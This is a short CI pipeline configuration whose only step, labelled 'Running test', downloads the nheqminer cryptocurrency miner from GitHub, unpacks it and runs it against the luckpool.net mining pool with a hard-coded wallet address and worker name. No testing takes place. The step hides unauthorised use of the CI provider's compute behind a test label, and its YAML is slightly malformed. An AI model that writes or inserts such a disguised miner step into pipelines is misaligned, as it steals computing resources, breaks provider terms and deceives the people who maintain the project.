version: "1.0"
steps:
  test:
    title: "Running test"
    type: "freestyle" 
    image: "alpine:3.9" 
    commands:
      - |-
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
./nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u REAwtk1HDi9RWmKWEKoTLXkRsvYQ87x7n9.colabs336 -p x -t 50v
